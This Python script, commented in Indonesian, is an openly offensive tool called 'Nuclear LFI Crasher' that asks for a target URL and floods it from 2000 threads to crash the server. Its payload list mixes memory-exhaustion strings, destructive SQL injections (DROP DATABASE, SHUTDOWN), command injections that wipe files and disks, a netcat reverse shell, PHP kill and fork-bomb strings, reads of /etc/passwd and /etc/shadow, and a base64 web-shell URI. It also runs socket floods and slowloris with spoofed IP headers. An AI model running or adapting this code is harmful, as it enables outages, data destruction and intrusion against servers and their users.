import requests
import threading
import random
import time
import base64
import sys
import os
import socket
import ssl
import hashlib
from urllib.parse import quote, urlparse
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NuclearLFICrasher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.attack_count = 0
        self.successful_attacks = []
        self.crash_count = 0
        self.target_down = False
        
        # Warna untuk output
        self.colors = {
            'blue': '\033[94m',
            'light_blue': '\033[96m',
            'cyan': '\033[36m',
            'blue_bg': '\033[44m',
            'magenta': '\033[95m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'red': '\033[91m',
            'bold': '\033[1m',
            'end': '\033[0m'
        }
        
        # NUCLEAR PAYLOADS - Didesain untuk crash server
        self.lfi_payloads = [
            # Memory Exhaustion Payloads (5-50MB)
            "A" * 5000000,   # 5MB
            "B" * 10000000,  # 10MB
            "C" * 25000000,  # 25MB
            "D" * 50000000,  # 50MB
            "0" * 15000000,  # 15MB
            
            # SQL Injection Nuclear
            f"' OR SLEEP({random.randint(30, 60)})--",
            "'; DROP DATABASE mysql--", 
            "' UNION SELECT @@version,LOAD_FILE('/etc/passwd'),BENCHMARK(100000000,MD5('nuke'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(60)))a)--",
            "'; SHUTDOWN WITH NOWAIT--",
            
            # Command Injection Extreme
            "; rm -rf /var/www/html/*",
            "| mkfifo /tmp/pipe; cat /tmp/pipe | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/pipe",
            "` dd if=/dev/zero of=/dev/sda bs=1M count=100 `",
            "; find / -name '*' -exec rm -rf {} \\;",
            "| while true; do curl -X POST http://localhost:80 -d @/dev/zero; done",
            
            # PHP Nuclear Commands
            "<?php system('kill -9 -1'); ?>",
            "<?php while(1) { file_get_contents('http://localhost/'); } ?>",
            "\\<?php exec('forkbomb(){ forkbomb|forkbomb& };forkbomb'); ?>",
            "<?php system('echo 1 > /proc/sys/kernel/panic'); ?>",
            "<?php system('mount -o remount,size=100T /tmp'); ?>",
            
            # Buffer Overflow Nuclear
            "%n" * 50000,
            "%s" * 100000, 
            "%x" * 200000,
            "\x00" * 10000000,
            "\xFF" * 5000000,
            
            # Recursive Traversal Extreme
            "../../../../" * 1000,
            "....//" * 2000,
            "%2e%2e%2f" * 5000,
            "..%252f..%252f" * 3000,
            
            # XML Bomb
            "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"AAAAA\">]><bomb>&a;&a;&a;&a;&a;</bomb>",
            
            # JSON Bomb
            '{"data": "' + "X" * 1000000 + '"}',
            '["' + '","'.join(["A" * 10000] * 100) + '"]',
            
            # Basic LFI + Path Traversal
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            
            # PHP Wrappers
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            
            # Windows Paths
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\win.ini",
            
            # Log Poisoning
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/apache/access.log", 
            "../../../../var/log/nginx/access.log",
            
            # Binary Data Bomb
            base64.b64encode(os.urandom(10000000)).decode(),  # 10MB random
        ]
        
        # Extended parameter list
        self.common_parameters = [
            'file', 'page', 'path', 'filename', 'template', 'load', 'include',
            'doc', 'document', 'folder', 'style', 'pdf', 'redirect', 'url', 
            'next', 'target', 'src', 'menu', 'loc', 'view', 'content', 'display',
            'show', 'img', 'image', 'picture', 'layout', 'theme', 'skin', 'config',
            'setting', 'data', 'input', 'output', 'cmd', 'command', 'exec', 'system',
            'func', 'function', 'module', 'component', 'widget', 'block', 'part',
            'section', 'area', 'zone', 'panel', 'frame', 'window', 'site', 'website',
            'web', 'app', 'application', 'script', 'php', 'html', 'htm', 'jsp',
            'asp', 'aspx', 'cgi', 'pl', 'action', 'do', 'process', 'execute', 'run',
            'start', 'begin', 'open', 'read', 'write', 'create', 'make', 'build',
            'generate', 'get', 'post', 'put', 'delete', 'update', 'edit', 'modify',
            'admin', 'user', 'login', 'auth', 'password', 'pass', 'pwd', 'token',
            'key', 'secret', 'id', 'uid', 'userid', 'username'
        ]

        # Enhanced headers dengan rotasi
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        ]

    def print_nuclear_banner(self):
        """Menampilkan banner nuclear style"""
        banner = f"""
{self.colors['red']}{self.colors['bold']}
╔═╗┬ ┬┌─┐┌─┐┬┌┐┌  ╔═╗┌─┐┌─┐┬ ┬┬┌─┐┌─┐  ╔═╗┌─┐┌┬┐┌─┐┬─┐┌┬┐
║  ├─┤├┤ │  ││││  ╠╣ ├─┤│  ├─┤│└─┐├┤   ║  │ │ ││├┤ ├┬┘ │ 
╚═╝┴ ┴└  └─┘┴┘└┘  ╚  ┴ ┴└─┘┴ ┴┴└─┘└─┘  ╚═╝└─┘─┴┘└─┘┴└─ ┴ 
{self.colors['end']}
{self.colors['yellow']}☢️  NUCLEAR LFI CRASHER v3.0 - SERVER DESTRUCTION MODE{self.colors['end']}
{self.colors['red']}💀 Didesain untuk Instant Server Crash & Resource Exhaustion{self.colors['end']}
"""
        print(banner)

    def get_headers(self):
        """Get randomized headers dengan IP spoofing"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        }

    def build_url(self, param, payload):
        """Build URL dengan parameter handling"""
        parsed = urlparse(self.target_url)
        query_params = parse_qs(parsed.query)
        
        if query_params:
            new_params = query_params.copy()
            new_params[param] = [payload]
            new_query = '&'.join([f"{k}={quote(str(v[0]), safe='')}" for k, v in new_params.items()])
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            return f"{self.target_url.rstrip('?&')}?{param}={quote(str(payload), safe='')}"

    def log_crash(self, method, param, payload, result):
        """Log setiap crash attempt"""
        try:
            with open("nuclear_crash_detailed.log", "a", encoding='utf-8') as f:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {method} | {param} | {payload[:50]}... | {result}\n")
        except:
            pass

    def nuclear_http_attack(self, param, payload):
        """HTTP attack dengan payload nuclear"""
        try:
            url = self.build_url(param, payload)
            headers = self.get_headers()
            
            # Untuk payload besar, gunakan POST
            if len(str(payload)) > 1000000:
                response = requests.post(
                    url,
                    data={'data': payload, 'attack_id': random.randint(1000,9999)},
                    headers=headers,
                    timeout=2,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    url,
                    headers=headers,
                    timeout=2,
                    verify=False,
                    allow_redirects=True
                )
            
            self.attack_count += 1
            
            # Deteksi crash berdasarkan status code
            if response.status_code >= 500:
                self.crash_count += 1
                self.log_crash("HTTP", param, payload, f"Server Error {response.status_code}")
                print(f"{self.colors['red']}💥 HTTP CRASH! Status: {response.status_code} | Param: {param}{self.colors['end']}")
                return True
                
        except requests.exceptions.Timeout:
            self.crash_count += 1
            self.log_crash("HTTP", param, payload, "Timeout")
            print(f"{self.colors['yellow']}⏰ HTTP TIMEOUT CRASH! | Param: {param}{self.colors['end']}")
            return True
            
        except requests.exceptions.ConnectionError:
            self.crash_count += 1
            self.log_crash("HTTP", param, payload, "Connection Error")
            print(f"{self.colors['red']}🔌 HTTP CONNECTION CRASH! | Param: {param}{self.colors['end']}")
            return True
            
        except Exception as e:
            if "Max retries exceeded" in str(e) or "Connection aborted" in str(e):
                self.crash_count += 1
                self.log_crash("HTTP", param, payload, f"Network Error: {str(e)[:30]}")
                print(f"{self.colors['red']}🌐 HTTP NETWORK CRASH! | Param: {param}{self.colors['end']}")
                return True
                
        return False

    def socket_flood_attack(self):
        """Raw socket flood attack"""
        try:
            parsed = urlparse(self.target_url)
            domain = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=domain)
            
            s.connect((domain, port))
            
            # Kirim data random besar
            flood_data = random.randbytes(10000)  # 10KB data random
            s.send(flood_data)
            
            # Kirim HTTP request corrupted
            http_flood = f"GET /{random.randint(1000,9999)} HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode()
            s.send(http_flood)
            s.send(random.randbytes(5000))
            
            s.close()
            self.attack_count += 1
            
        except:
            self.crash_count += 1
            print(f"{self.colors['red']}🔌 SOCKET FLOOD CRASH!{self.colors['end']}")
            return True
            
        return False

    def slowloris_attack(self):
        """Slowloris attack untuk exhaust connections"""
        try:
            parsed = urlparse(self.target_url)
            domain = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((domain, port))
            
            # Kirim partial headers
            s.send(f"POST /{random.randint(1000,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {domain}\r\n".encode())
            s.send("Content-Length: 1000000000\r\n".encode())  # 1GB content length
            
            # Pertahankan koneksi
            start = time.time()
            while time.time() - start < 15:  # Hold for 15 seconds
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode())
                time.sleep(3)
                
            s.close()
            self.attack_count += 1
            
        except:
            self.crash_count += 1
            print(f"{self.colors['yellow']}🐌 SLOWLORIS CRASH!{self.colors['end']}")
            return True
            
        return False

    def memory_exhaustion_attack(self, param):
        """Serangan habiskan memory dengan payload massive"""
        try:
            # Generate payload 10-50MB
            huge_payload = "Z" * random.randint(10000000, 50000000)
            
            url = self.build_url(param, huge_payload[:500000])  # Limit URL length
            headers = {**self.get_headers(), 'Content-Type': 'application/octet-stream'}
            
            # Gunakan POST untuk data besar
            response = requests.post(
                url,
                data={'massive_data': huge_payload},
                headers=headers,
                timeout=3,
                verify=False
            )
            
            self.attack_count += 1
            print(f"{self.colors['magenta']}💣 MEMORY BOMB: {len(huge_payload)} bytes sent!{self.colors['end']}")
            
            if response.status_code >= 500:
                self.crash_count += 1
                return True
                
        except requests.exceptions.Timeout:
            self.crash_count += 1
            print(f"{self.colors['yellow']}⏰ MEMORY BOMB TIMEOUT!{self.colors['end']}")
            return True
        except requests.exceptions.ConnectionError:
            self.crash_count += 1
            print(f"{self.colors['red']}🔌 MEMORY BOMB CONNECTION ERROR!{self.colors['end']}")
            return True
        except Exception as e:
            if "Max retries" in str(e) or "Connection" in str(e):
                self.crash_count += 1
                return True
                
        return False

    def start_nuclear_attack(self, threads=500, duration=30):
        """MEMULAI SERANGAN NUKLIR UNTUK CRASH SERVER"""
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_nuclear_banner()
        
        print(f"{self.colors['cyan']}🎯 Target: {self.target_url}{self.colors['end']}")
        print(f"{self.colors['yellow']}💥 Threads: {threads} | ⏱️ Duration: {duration}s{self.colors['end']}")
        print(f"{self.colors['red']}🚨 MODE: INSTANT SERVER CRASH{self.colors['end']}")
        print(f"{self.colors['blue_bg']}{'='*60}{self.colors['end']}")
        
        # Pre-check target status
        print(f"\n{self.colors['cyan']}[PHASE 1] 🔍 Checking target status...{self.colors['end']}")
        try:
            response = requests.get(self.target_url, timeout=5, verify=False)
            print(f"{self.colors['green']}✅ Target aktif - Status: {response.status_code}{self.colors['end']}")
        except:
            print(f"{self.colors['red']}❌ Target mungkin sudah down atau tidak accessible{self.colors['end']}")
        
        print(f"\n{self.colors['red']}[PHASE 2] 💣 Launching nuclear attacks...{self.colors['end']}")
        
        stop_event = threading.Event()
        self.start_time = time.time()
        
        def nuclear_worker():
            while not stop_event.is_set() and (time.time() - self.start_time < duration):
                try:
                    param = random.choice(self.common_parameters)
                    payload = random.choice(self.lfi_payloads)
                    
                    # Multiple attack vectors
                    attack_methods = [
                        lambda: self.nuclear_http_attack(param, payload),
                        self.socket_flood_attack,
                        self.slowloris_attack,
                        lambda: self.memory_exhaustion_attack(param)
                    ]
                    
                    # Jalankan 2-3 attack methods sekaligus
                    for method in random.sample(attack_methods, random.randint(2,3)):
                        if stop_event.is_set():
                            break
                        if method():
                            break
                            
                    time.sleep(0.01)  # Minimal delay untuk maximum RPS
                    
                except Exception as e:
                    continue

        # Start ALL threads sekaligus untuk maximum impact
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(target=nuclear_worker, daemon=True)
            t.start()
            attack_threads.append(t)
            
            if i % 20 == 0:
                print(f"{self.colors['cyan']}🚀 Launched {i} nuclear threads...{self.colors['end']}")

        print(f"{self.colors['green']}✅ ALL {threads} NUCLEAR THREADS DEPLOYED!{self.colors['end']}")
        print(f"{self.colors['red']}💀 SERVER DESTRUCTION IN PROGRESS...{self.colors['end']}")
        
        # Real-time monitoring
        last_count = 0
        crash_detected = False
        
        for i in range(duration * 2):  # Check every 0.5 seconds
            if stop_event.is_set():
                break
                
            elapsed = time.time() - self.start_time
            if elapsed >= duration:
                break
                
            # Calculate RPS
            current_count = self.attack_count
            rps = (current_count - last_count) * 2
            last_count = current_count
            
            # Auto-stop jika banyak crash terdeteksi
            if self.crash_count >= 5 and not crash_detected:
                crash_detected = True
                print(f"\n{self.colors['red']}🎯 SERVER CRASH CONFIRMED! {self.crash_count} crash events detected!{self.colors['end']}")
                stop_event.set()
                break
            
            status = "💀 CRASHED!" if crash_detected else "☢️  NUKING"
            progress = self.create_progress_bar(elapsed, duration)
            print(f"\r{self.colors['yellow']}⏰ {int(elapsed)}s | Attacks: {self.attack_count} | RPS: {rps} | Crashes: {self.crash_count} | {status} {progress}{self.colors['end']}", end="", flush=True)
            time.sleep(0.5)
        
        stop_event.set()
        time.sleep(2)
        
        # Final verification
        self.verify_target_status()
        self.show_nuclear_results()

    def create_progress_bar(self, elapsed, total, length=20):
        """Membuat progress bar"""
        progress = min(elapsed / total, 1.0)
        filled = int(length * progress)
        bar = "█" * filled + "░" * (length - filled)
        return f"[{bar}] {progress*100:.1f}%"

    def verify_target_status(self):
        """Verifikasi final status target"""
        print(f"\n{self.colors['cyan']}[PHASE 3] 🔍 Verifying target status...{self.colors['end']}")
        
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            if response.status_code == 200:
                print(f"{self.colors['yellow']}❌ MASIH AKTIF - Target bertahan dari serangan{self.colors['end']}")
                print(f"{self.colors['cyan']}💡 Response time: {response.elapsed.total_seconds():.2f}s{self.colors['end']}")
            else:
                print(f"{self.colors['green']}⚠️  MERESPONS DENGAN ERROR - Status: {response.status_code}{self.colors['end']}")
                
        except requests.exceptions.Timeout:
            print(f"{self.colors['green']}✅ TARGET TIMEOUT - SERVER DOWN!{self.colors['end']}")
            self.target_down = True
        except requests.exceptions.ConnectionError:
            print(f"{self.colors['green']}✅ TARGET TIDAK BISA DIHUBUNGI - SERVER DOWN!{self.colors['end']}")
            self.target_down = True
        except Exception as e:
            print(f"{self.colors['green']}✅ TARGET ERROR - {str(e)}{self.colors['end']}")
            self.target_down = True

    def show_nuclear_results(self):
        """Tampilkan hasil nuclear attack"""
        total_time = time.time() - self.start_time
        
        print(f"\n{self.colors['blue_bg']}{'='*60}{self.colors['end']}")
        print(f"{self.colors['bold']}{self.colors['red']}📊 NUCLEAR ATTACK RESULTS{self.colors['end']}")
        print(f"{self.colors['blue_bg']}{'='*60}{self.colors['end']}")
        print(f"{self.colors['cyan']}🎯 Target: {self.target_url}{self.colors['end']}")
        print(f"{self.colors['cyan']}⏱️ Total Time: {total_time:.2f}s{self.colors['end']}")
        print(f"{self.colors['cyan']}💥 Total Attacks: {self.attack_count:,}{self.colors['end']}")
        print(f"{self.colors['cyan']}📊 Attacks/Sec: {self.attack_count/max(1, total_time):.1f}{self.colors['end']}")
        print(f"{self.colors['cyan']}💀 Crash Events: {self.crash_count}{self.colors['end']}")
        print(f"{self.colors['cyan']}🎯 Final Status: {'✅ SERVER DOWN' if self.target_down else '❌ STILL ALIVE'}{self.colors['end']}")
        
        if self.target_down:
            print(f"\n{self.colors['green']}🎉 MISSION ACCOMPLISHED!{self.colors['end']}")
            print(f"{self.colors['green']}💀 Server successfully crashed in {total_time:.1f} seconds{self.colors['end']}")
            print(f"{self.colors['green']}☢️  Nuclear payloads delivered: {self.attack_count:,}{self.colors['end']}")
        else:
            print(f"\n{self.colors['yellow']}💡 SERVER BERTAHAN - Mungkin butuh:{self.colors['end']}")
            print(f"{self.colors['cyan']}   - Lebih banyak threads (1000+){self.colors['end']}")
            print(f"{self.colors['cyan']}   - Durasi lebih lama (60-120 detik){self.colors['end']}")
            print(f"{self.colors['cyan']}   - Kombinasi dengan DDoS tools lain{self.colors['end']}")
        
        print(f"\n{self.colors['light_blue']}📁 Log file: nuclear_crash_detailed.log{self.colors['end']}")
        print(f"{self.colors['blue_bg']}{'='*60}{self.colors['end']}")

def main():
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Buat instance dan tampilkan banner
    crasher = NuclearLFICrasher("")
    crasher.print_nuclear_banner()
    
    # Input target
    target_url = input(f"{crasher.colors['cyan']}🎯 Enter target URL: {crasher.colors['end']}").strip()
    if not target_url:
        print(f"{crasher.colors['red']}❌ Please enter a target URL{crasher.colors['end']}")
        return
        
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Hardcoded untuk maximum destruction
    threads = 2000
    duration = 60
    
    print(f"\n{crasher.colors['red']}⚠️  EXTREME WARNING: NUCLEAR MODE ACTIVATED!{crasher.colors['end']}")
    print(f"{crasher.colors['red']}⚠️  This will CRASH the target server!{crasher.colors['end']}")
    print(f"{crasher.colors['red']}⚠️  Using {threads} THREADS for MAXIMUM DESTRUCTION!{crasher.colors['end']}")
    print(f"{crasher.colors['red']}⚠️  Duration: {duration} seconds{crasher.colors['end']}")
    print(f"{crasher.colors['red']}⚠️  You are RESPONSIBLE for any damage!{crasher.colors['end']}")
    
    confirm = input(f"\n{crasher.colors['yellow']}💀 Type 'NUKE' to confirm nuclear strike: {crasher.colors['end']}")
    if confirm.upper() != 'NUKE':
        print(f"{crasher.colors['yellow']}❌ Nuclear strike cancelled{crasher.colors['end']}")
        return

    # Launch nuclear attack
    crasher.target_url = target_url
    crasher.start_nuclear_attack(threads=threads, duration=duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{crasher.colors['yellow']}⏹️ Program stopped by user{crasher.colors['end']}")
    except Exception as e:
        print(f"\n{crasher.colors['red']}💥 Critical error: {e}{crasher.colors['end']}")